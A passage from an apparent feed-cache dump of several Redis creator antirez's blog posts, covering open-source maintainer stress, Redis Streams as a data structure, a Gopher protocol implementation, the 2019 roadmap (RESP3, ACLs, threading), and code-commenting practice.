<br>I don’t believe in acting fast, thinking fast, winning the competition on time and stuff like that. I don’t like the world of constant lack of focus we live in, because of social networks, chats, emails, and a schedule full of activities. So when I used to receive an email about Redis back in the early times of the project, when I still had plenty of time, I was able to focus on what the author of the message was trying to tell me. Then I could recall the relevant part of Redis we were discussing, and finally reply with my real thoughts, after considering the matter with care. I believe this is how most people should work regardless of what their job is.
<br>
<br>When a software project reaches the popularity Redis reached, and at the same time once the communications between individuals are made so simple by the new social tools, and by your attitude to be “there” for users, the amount of messages, issues, pull requests, suggestions the authors receive will grow exponentially. At the same time, at least in the case of Redis, but I believe this to be a common problem, the amount of very qualified people that can look at such inputs from the community grows very slowly. This creates an obvious congestion. Most people try to address it in the wrong way: using pragmatism. Let’s close the issue after two weeks of no original poster replies, after we ask some question. Close all the issues that are not very well specified. And other “inbox zero” solutions. The reality is that to process community feedbacks very well you have to take the time needed, otherwise you will just pretend your project has a small number of open issues. Having a lot of resources to hire core-level experts for each Redis subsystem, to work at OSS full time, would work but is not feasible.
<br>
<br>So what happens? That you start to prioritize more and more what to look at and what not. And you feel you are a piece of shit at ignoring so many things and people, and also the contributor believes you don’t care about what others have to give you. It’s a complex situation. Usually the end result is to develop an attitude to mostly address critical issues and disregard all the new stuff, since new stuff are yet not in the core, and who wants to have a larger code base with even more PRs and issues there? Maybe also written in a more convoluted way compared to your usual programming style, so, more complexity, and good luck when there is a critical bug there to track the root cause.
<br>
<br>Role shifting
<br>
<br>As a result of the “flood effect” problem exposed above, you suddenly also change job. Redis became popular because I supposedly am able to design and write software. And now instead most of the work I do is to look at issues and pull requests, and I also feel that I could do better many of the contributions I receive. Some will be better quality than I could do, because there are also better programmers than me contributing to Redis, but *most* for the nature of big numbers will be average contributions that are just written to solve a given problem that was contingent for the folks that submitted it. While, when I design for Redis, I tend to think at Redis as a whole, because it’s years I write this thing. So what you were good at, you have no longer time to do. This in turn means less organic big new features. My solution with that? Sometimes I just stop looking at issues and PRs for weeks, because I’m coding or designing: that is the work I really love and enjoy. However this in turn creates ways more pressure on me, psychologically. To do what I love and I can do well I’ve to feel like shit.
<br>
<br>Time
<br>
<br>There are two problems related to working at the same project for a prolonged amount of time, at least for me.
<br>First, before of the Redis experience I *never* worked every week day of my life. I could work one week, stop two, then work one month, then disappear for other two months. Always. People need to recharge, get new energy and ideas, to do creative work. And programming at high level is a fucking creative job. Redis itself was created like that for the first two years, that is, when the project evolved at the fastest speed. Because the sum of the productivity of me working just when I want is greater than the productivity I’ve when I’m forced to work every day in a steady way.
<br>
<br>However my work ethics allowed me to have a very discontinue schedule when I was working alone with my companies. Once I started to receive money to work at Redis, it was no longer possible for my ethics to have my past pattern, so I started to force myself to work under normal schedules. This for me is a huge struggle, for many years at this point. Moreover I’m sure I’m doing less than I could because of that, but this is how things work. I never found a way to solve this problem. I could say Redis Labs that I want to return to my old schedule, but that would not work because at this point I really “report” to the community, not to the company.
<br>
<br>Another problem is that working a lot at the same project is also a complex matter, mentally speaking. I used to change project every six months in the past. Now for ten years I did the same thing. In that regard I tried to save my sanity by having sub-projects inside Redis. One time I did Cluster, another time disk-storage (now abandoned), another was HyerLogLogs, and so forth. Basically things that bring value to the project but that, in isolation, are other stuff. But eventually you have to return back to the issues and PRs page and address the same things every day. “Replica is disconnecting because of a timeout” or whatever. Let’s investigate that again.
<br>
<br>Fear
<br>
<br>I always had some fear to lose the technological leadership of the project. Not because I think I’m not good enough at designing and evolving Redis, but because I know my ways are not aligned with: 1) what a sizable amount of users want. 2) what most people in IT believe software is. So I had to constantly balance between what I believe to be good design, set of features, speed of development (slow), size of the project (minimal), and what I was expected to deliver by most of the user base. Fortunately there is a percentage of Redis users that understand perfectly the Redis-way, so at least from time to time I can get some word of comfort.
<br>
<br>Frictions
<br>
<br>Certain people are total assholes. They are everywhere, it is natural and if you ask me, I even believe in programming there are a lot more nice people than in other fields. But yet you’ll always see a percentage of total jerks. As the leader of a popular OSS project, in one way or the other you’ll have to confront with these people, and that’s maybe one of the most stressful things I ever did in the course of the Redis development.
<br>
<br>Futileness
<br>
<br>Sometimes I believe that software, while great, will never be huge like writing a book that will survive for centuries. Note because it is not as great per-se, but because as a side effect it is also useful… and will be replaced when something more useful is around. I would like to have time to do other activities as well. So sometimes I believe all I’m doing is, in the end, futile. We’ll design and write systems, and new systems will emerge; but anyone that just stays in software, instead of staying in “software big ideas”, will ever set a new mark? From time to time I think I had potentially the ability to work at big ideas but because I focused on writing software instead of thinking about software, I was not able to use my potential in that regard. This is basically the contrary of the impostor syndrome, so I guess I’ve a big idea of myself: sorry for that I should be more humble.
<br>
<br>That said, I was able to work for many years doing things I really loved, that gave me friends, recognition, money, so I don’t want to say it was a bad deal. Yet I totally understand people struggling a lot to stay afloat once their projects start to be popular. This blog post is dedicated to them.
<a href=\"http://antirez.com/news/129\">Comments</a>" nil "http://antirez.com/news/129" "469a02d7483196fdacaa8988d903d765") (81 (26588 31767 76197 544000) "http://antirez.com/news/128
" "Redis streams as a pure data structure " nil "Fri, 22 Mar 2019 15:10:15 +0000" "The new Redis data structure introduced in Redis 5 under the name of “Streams” generated quite some interest in the community. Soon or later I want to run a community survey, talking with users having production use cases, and blogging about it. Today I want to address another issue: I’m starting to suspect that many users are only thinking at Streams as a way to solve Kafka(TM)-alike use cases. Actually the data structure was designed to *also* work in the context of messaging with producers and consumers, but to think that Redis Streams are just good for that is incredibly reductive. Streaming is a terrific pattern and “mental model” that can be applied when designing systems with great success, but Redis Streams, like most Redis data structures, are more general, and can be used to model dozen of different unrelated problems. So in this blog post I’ll focus on Streams as a pure data structure, completely ignoring its blocking operations, consumer groups, and all the messaging parts.
<br>
<br>## Streams are CSV files on steroids
<br>
<br>If you want to log a series of structured data items and decided that databases are overrated after all, you may say something like: let’s just open a file in append only mode, and log every row as a CSV (Comma Separated Value) item:
<br>
<br>(open data.csv in append only)
<br>time=1553096724033,cpu_temp=23.4,load=2.3
<br>time=1553096725029,cpu_temp=23.2,load=2.1
<br>
<br>Looks simple and people did this for ages and still do: it’s a solid pattern if you know what you are doing. But what is the in-memory equivalent of that? Memory is more powerful than an append only file and can automagically remove the limitations of  a CSV file like that:
<br>
<br>1. It’s hard (inefficient) to do range queries here.
<br>
<br>2. There is too much redundant information: the time is almost the same in every entry and the fields are duplicated. At the same time removing it will make the format less flexible, if I want to switch to a different set of fields.
<br>
<br>3. Item offsets are just the byte offset in the file: if we change the file structure the offset will be wrong, so there is no actual true concept of primary ID here. Entries are basically not univocally addressed in some way.
<br>
<br>4. I can’t remove entries, but only mark them as no longer valid without the ability of garbage collecting, if not by rewriting the log. Log rewriting usually sucks for several reasons and if it can be avoided, it’s good.
<br>
<br>Still such log of CSV entries is also great in some way: there is no fixed structure and fields may change, is trivial to generate, and after all is quite compact as well. The idea with Redis Streams was to retain the good things, but go over the limitations. The result is a hybrid data structure very similar to Redis Sorted Sets: they *feel like* a fundamental data structure, but to get such an effect, internally it uses multiple representations.
<br>
<br>## Streams 101 (you may skip that if you know already Redis Stream basics)
<br>
<br>Redis Streams are represented as delta-compressed macro nodes that are linked together by a radix tree. The effect is to be able to seek to random entries in a very fast way, to obtain ranges if needed, remove old items to create a capped stream, and so forth. Yet our interface to the programmer is very similar to a CSV file:
<br>
<br>> XADD mystream * cpu-temp 23.4 load 2.3
<br>\"1553097561402-0\"
<br>> XADD mystream * cpu-temp 23.2 load 2.1
<br>\"1553097568315-0\"
<br>
<br>As you can see from the example above the XADD command auto generates and returns the entry ID, which is monotonically incrementing and has two parts: <time>-<counter>. The time is in milliseconds and the counter increases for entries generated in the same milliseconds.
<br>
<br>So the first new abstraction on top of the “append only CSV file” idea is that, since we used the asterisk as the ID argument of XADD, we get the entry ID for free from the server. Such ID is not only useful to point to a specific item inside a stream, it’s also related to the time when the entry was added to the stream. In fact with XRANGE it is possible to perform range queries or fetch single items:
<br>
<br>> XRANGE mystream 1553097561402-0 1553097561402-0
<br>1) 1) \"1553097561402-0\"
<br>   2) 1) \"cpu-temp\"
<br>      2) \"23.4\"
<br>      3) \"load\"
<br>      4) \"2.3\"
<br>
<br>In this case I used the same ID as the start and the stop of the range in order to identify a single element. However I can use any range, and a COUNT argument to limit the number of results. Similarly there is no need to specify full IDs as range, I can just use the millisecond unix time part of the IDs, to get elements in a given range of time:
<br>
<br>> XRANGE mystream 1553097560000 1553097570000
<br>1) 1) \"1553097561402-0\"
<br>   2) 1) \"cpu-temp\"
<br>      2) \"23.4\"
<br>      3) \"load\"
<br>      4) \"2.3\"
<br>2) 1) \"1553097568315-0\"
<br>   2) 1) \"cpu-temp\"
<br>      2) \"23.2\"
<br>      3) \"load\"
<br>      4) \"2.1\"
<br>
<br>For now there is no need to show you more Streams API, there is the Redis documentation for that. For now let’s just focus on that usage pattern: XADD to add stuff, XRANGE (but also XREAD) in order to fetch back ranges (depending on what you want to do), and let’s see why I claim Streams are so powerful as a data structure.
<br>
<br>However if you want to learn more about Redis Streams and their API, make sure to visit the tutorial here: https://redis.io/topics/streams-intro
<br>
<br>## Tennis players
<br>
<br>A few days ago I was modeling an application with a friend of mine which is learning Redis those days: an app in order to keep track of local tennis courts, local players and matches. The way you model players in Redis is quite obvious, a player is a small object, so an Hash is all you need, with key names like player:<id>. As you model the application data further, to use Redis as its primary, you immediately realize you need a way to track the games played in a given tennis club. If player:1 and player:2 played a game, and player 1 won, we could write the following entry in a stream:
<br>
<br>> XADD club:1234.matches * player-a 1 player-b 2 winner 1
<br>\"1553254144387-0\"
<br>
<br>With this simple operation we have:
<br>
<br>1. A unique identifier of the match: the ID in the stream.
<br>2. No need to create an object in order to identify a match.
<br>3. Range queries for free to paginate the matches, or check the matches played in a given moment in the past.
<br>
<br>Before Streams we needed to create a sorted set scored by time: the sorted set element would be the ID of the match, living in a different key as a Hash value. This is not just more work, it’s also an incredible amount of memory wasted. More, much more you could guess (see later).
<br>
<br>For now the point to show is that Redis Streams are kinda of a Sorted Set
<br>in append only mode, keyed by time, where each element is a small Hash. And in its simplicity this is a revolution in the context of modeling for Redis.
<br>
<br>## Memory usage
<br>
<br>The above use case is not just a matter of a more solid pattern. The memory cost of the Stream solution is so different compared to the old approach of having a Sorted Set + Hash for every object that makes certain things that were not viable, now perfectly fine.
<br>
<br>Those are the numbers for storing one million of matches in the configurations exposed previously:
<br>
<br>Sorted Set + Hash memory usage = 220 MB (242 RSS)
<br>Stream memory usage                  = 16.8 MB (18.11 RSS)
<br>
<br>This is more than an order of magnitude difference (13 times difference exactly), and it means that use cases that yesterday were too costly for in-memory now are perfectly viable. The magic is all in the representation of Redis Streams: the macro nodes can contain several elements that are encoded in a data structure called listpack in a very compact way. Listpacks will take care, for instance, to encode integers in binary form even if they are semantically strings. On top of that, we then apply delta compression and same-fields compression. Yet we are able to seek by ID or time because such macro nodes are linked in the radix tree, which was also designed to use little memory. All these things together account for the low memory usage, but the interesting part is that semantically the user does not see any of the implementation details making Streams efficient.
<br>
<br>Now let’s do some simple math. If I can store 1 million entries in about 18 MB of memory, I can store 10 millions in 180 MB, and 100 millions in 1.8 GB. With just 18 GB of memory I can have 1 billion items.
<br>
<br>## Time series
<br>
<br>One important thing to note is, in my opinion, how the usage above where we used a Stream to represent a tennis match was semantically *very different* than using a Redis Stream for a time series. Yes, logically we are still logging some kind of event, but one fundamental difference is that in one case we use the logging and the creation of entries in order to render objects. While in the case of time series, we are just metering something happening externally, that does not really represent an object. You may think that this difference is trivial but it’s not. It is important for Redis users to build the idea that Redis Streams can be used in order to create small objects that have a total order, and assign IDs to such objects.
<br>
<br>However even the most basic use case of time series is, obviously, a huge one here, because before Streams Redis was a bit hopeless in regard to such use case. The memory characteristics and flexibility of streams, plus the ability to have capped streams (see the XADD options), is a very important tool in the hands of the developer.
<br>
<br>## Conclusions
<br>
<br>Streams are flexible and have lots of use cases, however I wanted to take this blog post short to make sure that there is a clear take-home message in the above examples and analysis of the memory usage. Perhaps this was already obvious to many readers, but talking with people in the last months gave me the feeling that there was a strong association between Streams and the streaming use case, like if the data structure was only good at that. That’s not the case :-)
<a href=\"http://antirez.com/news/128\">Comments</a>" nil "http://antirez.com/news/128" "a175805e09eef0312a33b53f4546e678") (80 (26588 31767 75680 166000) "http://antirez.com/news/127
" "Gopher: a present for Redis " nil "Mon, 25 Feb 2019 17:17:23 +0000" "Ten years ago Redis was announced on Hacker News, and I use this as virtual birthdate for the project, simply because it is more important when it was announced to the public than the actual date of the project first line of code (think at it conception VS actual birth in animals).  I’ll use the ten years of Redis as an excuse to release something I played a bit in the previous days, thinking to use it for the 1st April fool: but such date is far and I want to talk to you about this project now… So, happy birthday Redis! Here it’s your present: a Gopher protocol implementation.
<br>
<br>[… here Redis tries to stop the tears, but the emotion is too strong and there are bits (I mean zeros and ones) on the floor …]
<br>
<br>WTF are you saying?! should be your automatic question. Gopher in 2019 sounds a bit strange. However it is not *just* a joke, while it is largely a joke. The implementation is just 100 lines of code after all, excluding the external tool to render the pages into Redis keys. But… the thing is that there is really an active community around Gopher, a very small one but one that is growing in the latest years and months. There are people that feel that internet is no longer what it used to be. There is too much control, companies tracking, comments, likes, retweets, to the point that the content is no longer the king. One writes new things for them to be popular for 5 hours and disappear. There is no longer a discussion that can survive more than a few minutes without becoming some kind of flame, unless all the parties self-censor every possible feeling, uneasy word, and belief, to the point to make the discussion quite useless. Finally to load a stupid page with 1k of text requires to load 50 javascript files, to see the screen flickering since client-side rendering is cool, and so forth.
<br>
<br>On the other hand Gopher is a text only protocol that is great to deliver text only documents where the stress is in what you write. But that would be fetichism, for me the silver bullet of Gopher is that it is UNCOOL. Uncool enough that it will be forever, AFAIK, an alternative reality where certain folks can decide to separate from the rest, to experience a different way to do things, more similar to the old times of BBSs or the first years of the internet. A place where most people will not want to go just to read nerdy stuff in an 80 columns fixed size font.
<br>
<br>What you do in Gopher is to create your Gopher hole, that is, your space inside the Gopher universe, like your web site on the internet basically. There was no shortage of tools to do that already, but Redis is quite nice for a few reasons: you can change the Redis keys to change the site content in real time, that’s handy. You can use replication in order to duplicate a site, and can even just save your RDB file to have an exact copy of the whole Gopher hole to archive for backup or historical reasons.
<br>
<br>This Redis Gopher concept was created with the collaboration of Freaknet, a historical hacking laboratory experience here in Catania. https://it.wikipedia.org/wiki/FreakNet.
<br>Those folks do a lot of interesting stuff, including a retrocomputing hardware museum project in Palazzolo Acreide here: https://museo.freaknet.org/en/.
<br>
<br>How it works?
<br>
<br>Well it’s trivial, I hijacked the inline protocol, and specifically two kind of inline requests that were anyway illegal: an empty request or any request that starts with \"/\" (there are no Redis commands starting with such a slash). Normal RESP2/RESP3 requests are completely out of the path of the Gopher protocol implementation and are served as usually as well. If you open a connection to Redis when Gopher is enabled and send it a string like \"/foo\", if there is a key named \"/foo\" it is served via the Gopher protocol. The whole implementation is 100 lines of code. Initially I thought about using data structures and have semantical transformations to Gopher types, but that’s just complex and useless.
<br>
<br>Instead what I did was to provide an authoring tool for Gopher over Redis, you can find it here:
<br>
<br>	https://github.com/antirez/gopher2redis
<br>
<br>To see that example Gopher hole running on a Redis instance just go to gopher://gopher.antirez.com, and btw that will be the address of my Gopher hole once I’ll build one in the next days. P.S. I suggest using the Lynx text only web/gopher browser to access Gopher.
<br>
<br>The gopher support is disabled by default, to enable it use the Redis unstable branch and use the “gopher-enabled” option, setting it to yes. However MAKE SURE to also password protect Redis: the Gopher protocol will still serve content, but at the same time normal Redis commands will not be accessible. This way (and assuming you don’t have data other than your Gopher keys to expose in the instance) you could make the instance public, as a true Gopher server.
<br>
<br>Well, have fun with Gopher! I hope this Gopher thing will go forward, I really believe there are a few of us that need to create a community outside the chaos of the modern Internet. No, it will not be possible to have no interactions. For instance I’ve no plans to stop blogging or using Internet. But certain slower higher quality communications need a place to prosper.
<a href=\"http://antirez.com/news/127\">Comments</a>" nil "http://antirez.com/news/127" "96ca45a2e7b744500f71e1916150a5c4") (79 (26588 31767 75364 635000) "http://antirez.com/news/126
" "An update about Redis developments in 2019 " nil "Wed, 20 Feb 2019 12:14:11 +0000" "Yesterday a concerned Redis user wrote the following on Hacker News:
<br>
<br>— https://news.ycombinator.com/item?id=19204436 —
<br>I love Redis, but I'm a bit skeptical of some of the changes that are currently in development. The respv3 protocol has some features that, while they sound neat, also could significantly complicate client library code. There's also a lot of work going into a granular acl. I can't imagine why this would be necessary, or a higher priority than other changes like multi-thread support, better persistence model, data-types, etc.
<br>— end of user comment —
<br>
<br>I’ve the feeling she/he (not sure) is not the only one that looks at ACLs as some sort of feature imposed by the Redis Labs goals, because “enterprise users” or something like that. Also the other points in the comment are interesting, and I believe everything is very well worth addressing in order to communicate clearly with the Redis community what’s the road ahead.
<br>
<br>For simplicity I’ll split this blog post into sections addressing every single feature mentioned in the original comment.
<br>
<br>## RESP3
<br>
<br>The goal of RESP3, as I already blogged in these pages, is to actually simplify the clients landscape. Hopefully every client will have a lower layer that will not try to reinvent some kind of higher level interface: redis.call(“get”,”foo”). There is no longer need to orchestrate conversions because now the protocol is semantical enough to tell the client what a given reply should look like in the hand of the caller, nor any need to know beforehand the command fingerprint for the majority of commands. What I think the user is referring is RESP3 support for out of band communications, that is the reply “attributes”.
<br>
<br>I really believe that in the future of Redis “client side caching” will be a big thing. It’s the logical step in every scalable system. However without server assistance client side cache invalidation is a nightmare. This is the reason why RESP3 supports attributes in replies, mainly. However probably Redis 6 *will not implement any of that*. Redis unstable, that will become Redis 6, already has a RESP3 implementation that is almost complete, and there are no attributes. The clients implementing RESP3 can just decide to discard attributes if they are willing to be really future-proof, and likely attributes will not be sent at all anyway even for future Redis versions if the user did not activate some kind of special feature. For instance, for client side caching, the connection will have to be put in some special mode. Moreover, as you know, Redis 6 will be completely backward compatible with RESP2. Actually I’m starting to believe that RESP2 support will never be removed, because it is almost for free, and there is no good reason to break backward compatibility once we did the effort to implement the abstraction layer between RESP2 and RESP3.
<br>
<br>Normally I don’t like to change things without a good reason, however RESP2 limitations were having a strong effect on the client ecosystem. I would like to have a client landscape where users, going from one client to the other, will feel at home, and the API will be the Redis API, not the layer that the client author invented. I’m not against an *higher level* API in addition to the lower level one btw, but there should be a common ground, and clients should be able to send commands without knowing anything about such commands.
<br>
<br>## ACLs
<br>
<br>The ACL specification was redacted by myself four years ago. I waited so much time in order to convince myself this was really the time to implement it: we went a long way without any ACL using just tricks, mainly command renaming. However don’t believe that ACLs main motivation is enterprise customers in need for security. As a side effect, ACLs also allow authentication of users for security purposes, but the main goal of the feature is *operational*.
<br>
<br>Let me show you an example. You have a Redis instance and you plan to use the instance to do a new thing: delayed jobs processing. You get a library from the internet, and it looks to work well. Now why on the earth such library, that you don’t know line by line, should be able to call “FLUSHALL” and flush away your database instantly? Maybe the library test will have such command inside and you realize it when it’s too late. Or maybe you just hired a junior developer that is keeping calling “KEYS *” on the Redis instance, while your company Redis policy is “No KEYS command”.
<br>
<br>Another scenario, cloud providers: they need to carefully rename the admin commands, and even to mask such commands from being leaked for some reason. More tricks: so MONITOR will not show the commands in the output for instance. With ACLs you can setup Redis so that default users, without some authentication, will be prevented to run anything that is administrative or dangerous. I think this will be a big improvement for operations.
<br>
<br>Moreover ACLs is one of the best code I wrote for Redis AFAIK. There is nearly no CPU cost at all, unless you se key patterns, but even so it’s small. The implementation is completely self contained inside the acl.c file, the rest of the core has a handful of calls to the ACL API. No complexity added to the system because it is completely modular. Actually the ACL code allowed to do some good refactoring around the AUTH command.
<br>
<br>## Multi threading
<br>
<br>There are two possible multi threading supports that Redis could get. I believe the user is referring to “memcached alike” multithreading, that is the ability to scale a single Redis instance to multiple threads in order to increase the operations per second it can deliver in things like GET or SET and other simple commands. This involves making the I/O, command parsing and so forth multi threaded. So let’s call this thing “I/O threading”.
<br>
<br>Another multi threaded approach is to, instead, allow slow commands to be executed in a different thread, so that other clients are not blocked. We’ll call this threading model “Slow commands threading”.
<br>
<br>Well, that’s the plan: I/O threading is not going to happen in Redis AFAIK, because after much consideration I think it’s a lot of complexity without a good reason. Many Redis setups are network or memory bound actually. Additionally I really believe in a share-nothing setup, so the way I want to scale Redis is by improving the support for multiple Redis instances to be executed in the same host, especially via Redis Cluster. The things that will happen in 2019 about that are two:
<br>
<br>A) Redis Cluster multiple instances will be able to orchestrate to make a judicious use of the disk of the local instance, that is, let’s avoid an AOF rewrite at the same time.
<br>
<br>B) We are going to ship a Redis Cluster proxy as part of the Redis project, so that users are able to abstract away a cluster without having a good implementation of the Cluster protocol client side.
<br>
<br>Another thing to note is that Redis is not Memcached, but, like memcached, is an in-memory system. To make multithreaded an in-memory system like memcached, with a very simple data model, makes a lot of sense. A multi-threaded on-disk store is mandatory. A multi-threaded complex in-memory system is in the middle where things become ugly: Redis clients are not isolated, and data structures are complex. A thread doing LPUSH need to serve other threads doing LPOP. There is less to gain, and a lot of complexity to add.
<br>
<br>What instead I *really want* a lot is slow operations threading, and with the Redis modules system we already are in the right direction. However in the future (not sure if in Redis 6 or 7) we’ll get key-level locking in the module system so that threads can completely acquire control of a key to process slow operations. Now modules can implement commands and can create a reply for the client in a completely separated way, but still to access the shared data set a global lock is needed: this will go away.
<br>
<br>## Better persistence
<br>
<br>Recently we did multiple efforts in order to improve this kind of fundamental functions of Redis. One of the best thing that was implemented lately is the RDB preamble inside the AOF file. Also a lot of work went both in Redis 4 and 5 about replication, that is now completely at another level compared to what it used to be. And yes, it is still one of my main focus to improve such parts.
<br>
<br>## Data structures
<br>
<br>Now Redis has Streams, starting with Redis 5. For Redis 6 and 7 what is planned is, to start, to make what we have much more memory efficient by changing the implementations of certain things. However to add new data structures there are a lot of considerations to do. It took me years to realize how to fill the gap, with streams, between lists, pub/sub and sorted sets, in the context of time series and streaming. I really want Redis to be a set of orthogonal data structures that the user can put together, and not a set of *tools* that are ready to use. Streams are an abstract log, so I think it’s a very worthwhile addition. However other things I’m not completely sure if they are worth to be inside the core without a very long consideration. Anyway in the latest years there was definitely more stress in adding new data structures. HyperLogLogs, more advanced bit operations, streams, blocking sorted set operations (ZPOP* and BZPOP*), and streams are good examples.
<br>
<br>## Conclusions
<br>
<br>I believe that the Redis community should be aware about why something is done and why something is instead postponed. I do the error to communicate a lot via Twitter like if everybody is there, but many people happen to have a life :-D and don’t care. The blog is a much better way to inform the community, I need to take the time to blog more. Incidentally I love to write posts, so it’s a win-win. An important thing to realize is that Redis has not a solid roadmap, over the years I found that opportunistic development is a huge win over having a roadmap. Something is demanded? I see the need? I’m in the mood to code it? It’s the right moment because there are no other huge priorities? There are a set of users that are helping the design process, giving hints, ideas, testing stuff? It’s the right moment, let’s do it. To have a solid roadmap for Redis is silly because the size of the OSS core team is small, sometimes I remain stuck with some random crash for weeks… Any fixed long term plan would not work. Moreover as the Redis community gives feedbacks my ideas change a lot, so I would rewrite the roadmap every month. Yet blogging is a good solution to at least show what is the current version of the priorities / ideas, and to show why other ideas were abandoned.
<br>
<br>A final note: the level of freedom I've with Redis Labs about what to put inside the open source project side is almost infinite. I think this is kinda of a miracle in the industry, or just the people I work with at Redis Labs are nice folks that understand that what we are doing originated from the open source movement and is wise to keep it going in that way. But it's not a common thing. If I do errors in the Redis roadmap they are surely my errors.
<a href=\"http://antirez.com/news/126\">Comments</a>" nil "http://antirez.com/news/126" "80c1d4ccfd9603697418fc30802d5c52") (78 (26588 31767 74800 845000) "http://antirez.com/news/125
" "Why RESP3 will be the only protocol supported by Redis 6 " nil "Fri, 09 Nov 2018 15:31:10 +0000" "[EDIT! I'm reconsidering all this because Marc Gravell
<br> from Stack Overflow suggested that we could just switch protocol for backward compatibility per-connection, sending a command to enable RESP3. That means no longer need for a global configuration that switches the behavior of the server. Put in that way it is a lot more acceptable for me, and I'm reconsidering the essence of the blog post]
<br>
<br>A few weeks after the release of Redis 5, I’m here starting to implement RESP3, and after a few days of work it feels very well to see this finally happening. RESP3 is the new client-server protocol that Redis will use starting from Redis 6. The specification at https://github.com/antirez/resp3 should explain in clear terms how this evolution of our old protocol, RESP2, should improve the Redis ecosystem. But let’s say that the most important thing is that RESP3 is more “semantic” than RESP2. For instance it has the concept of maps, sets (unordered lists of elements), attributes of the returned data, that may augment the reply with auxiliary information, and so forth. The final goal is to make new Redis clients have less work to do for us, that is, just deciding a set of fixed rules in order to convert every reply type from RESP3 to a given appropriate type of the client library programming language.
<br>
<br>In the future of Redis I see clients that are smarter under the hood, trying to do their best in order to handle connections, pipelining, and state, and apparently a lot more simpler in the user-facing side, to the point that the ideal Redis client is like:
<br>
<br>    result = redis.call(“GET”,keyname);
<br>
<br>Of course on top of that you can build more advanced abstractions, but the bottom layer should look like that, and the returned reply should not require any filtering that is ad-hoc for specific commands: RESP3 return type should contain enough information to return an appropriate data type. So HGETALL will return a RESP3 “map”, while LRANGE will return an “array”, and EXISTS will return a RESP3 “boolean”.
<br>
<br>This also allows new commands to work as expected even if the client library was not *specifically* designed to handle it. With RESP2 instead what happened was that likely the command worked using mechanisms like \"method missing\" or similar, but later when the command was *really* implemented in the client library, the returned type changed, introducing a subtle incompatibility.
<br>
<br>However, while the new protocol is an incremental improvement over the old one, it will introduce breaking incompatibilities in the client-library side (of course) and *in the application layer* as well. Because for instance, ZSCORE will now return a double, and not a string, so application code should be updated, or, alternatively, client libraries could implement a compatibility option that will turn the RESP3 replies back to their original RESP2 types.
<br>
<br>Lua scripts will also no longer work if not modified for the new protocol, because also Lua will see more semantical types returned by the redis.call() command. Similarly Lua will be able to return all the new data types implemented in RESP3.
<br>
<br>Because of all that, people are scared about my decision: I’m going to ship Redis 6 with support for *only* RESP3. There will be no compatibility mode to switch a Redis 6 server to RESP2, so you either upgrade your client library and upgrade your application (or use the client library backward compatibility mode), or you cannot switch to Redis 6.
<br>
<br>I’ve good reasons to do so, and I want to explain why I’m taking this decision, and how I’m mitigating the problems for users and client library authors. Let’s start from the mitigations:
<br>
<br>* Redis 5 will be fully supported for 2 years after the release of Redis 6. Everything critical will be back-ported to Redis 5 and patch-level releases will be available constantly.
<br>
<br>* Redis 6 is expected to be released in about 1 or 1.5 years. However Redis 6 will be switched to RESP3 in about 1 month. So people will use, experiment, and deal with an unstable Redis version that uses the new protocol for a lot of time. Given that unlike many other softwares, Redis unstable has a lot of casual users, both because it’s the default branch on Github, and because traditionally Redis unstable is never really so unstable, this will grant a lot of prior exposure.
<br>
<br>* I’m still not 100% sure about that, but the Lua scripting engine may have a compatibility mode in order to return the same types as of Redis 5. The compatibility however will not be enabled by default, and will be opt-in for each script executed, by calling a special redis.resp2_compat() function before calling Redis commands. So every Redis 6 server will behave the same regardless of its configuration, as Redis always did in the last 10 years.
<br>
<br>Those are the mitigations. And this is, instead, why I’ll not have Redis 6 supporting both versions:
<br>
<br>1) It is more or less completely useless. If people switch Redis 6 to RESP2 mode, they are still in the past and are just waiting for Redis 7 to go out without RESP2 support and break everything. In the meantime, when you deal with a Redis 6 installation, you never know *what it replies*, depending on how it is configured. So the same client library may return an Hash or an Array for the same command.
<br>
<br>2) It’s more work and more complexity without a good reason (see “1”). Many commands will require a check for the old protocol in order to see in what format to reply.
<br>
<br>3) By binding the new Redis 6 features together with a protocol change, we are giving good reasons to users to do the switch and port their clients and applications. At some point everything will be over and we can focus on new things. Otherwise we’ll have a set of Redis 6 users that switched to the new server for the new features but are still with the old protocol, and Redis 7 will be the same drama again.
<br>
<br>4) If somebody tells you that adapting the client libraries is a terrible work, well, I’ll beg to differ. Yes, there is some change to do, but now that I’m implementing the server side, I see that it’s not so terrible. What is terrible instead is that most client work is not payed at all and happens just because of passion and willingness to share with others. I bet that we’ll see many implementations of RESP3 in short time.
<br>
<br>5) RESP3 is designed so that clients can automatically detect if it’s RESP2 or RESP3, and switch, so new clients will work both with Redis <= 5 and Redis 6.
<br>
<br>Well that’s all. I hope it clarifies my point of view and the reasons behind it, and also at the same time the mitigations that will be enabled during the protocol switch may serve to convince users that it will not be a very “hard” breakage.
<a href=\"http://antirez.com/news/125\">Comments</a>" nil "http://antirez.com/news/125" "b795e138694f63cb2b6ce5f8e6e60128") (77 (26588 31767 74356 892000) "http://antirez.com/news/124
" "Writing system software: code comments. " nil "Sat, 06 Oct 2018 20:08:58 +0000" "For quite some time I’ve wanted to record a new video talking about code comments for my \"writing system software\" series on YouTube. However, after giving it some thought, I realized that the topic was better suited for a blog post, so here we are. In this post I analyze Redis comments, trying to categorize them.  Along the way I try to show why, in my opinion, writing comments is of paramount importance in order to produce good code, that is maintainable in the long run and understandable by others and by the authors during modifications and debugging activities.
<br>
<br>Not everybody thinks likewise. Many believe that comments are useless if the code is solid enough. The idea is that when everything is well designed, the code itself documents what the code is doing, hence code comments are superfluous. I disagree with that vision for two main reasons:
<br>
<br>1. Many comments don't explain what the code is doing. They explain what you can't understand just from what the code does. Often this missing information is *why* the code is doing a certain action, or why it’s doing something that is clear instead of something else that would feel more natural.
<br>
<br>2. While it is not generally useful to document, line by line, what the code is doing, because it is understandable just by reading it, a key goal in writing readable code is to lower the amount of effort and the number of details the reader should take into her or his head while reading some code. So comments can be, for me, a tool for lowering the cognitive load of the reader.
<br>
<br>The following code snippet is a good example of the second point above. Note that all the code snippets in this blog post are obtained from the Redis source code. Every code snipped is presented prefixed by the file name it was extracted from. The branch used is the current \"unstable\" with hash 32e0d237.
<br>
<br>scripting.c:
<br>    /* Initial Stack: array */
<br>    lua_getglobal(lua,\"table\");
<br>    lua_pushstring(lua,\"sort\");
<br>    lua_gettable(lua,-2);       /* Stack: array, table, table.sort */
<br>    lua_pushvalue(lua,-3);      /* Stack: array, table, table.sort, array */
<br>    if (lua_pcall(lua,1,0,0)) {
<br>        /* Stack: array, table, error */
<br>
<br>        /* We are not interested in the error, we assume that the problem is
<br>         * that there are 'false' elements inside the array, so we try
<br>         * again with a slower function but able to handle this case, that
<br>         * is: table.sort(table, __redis__compare_helper) */
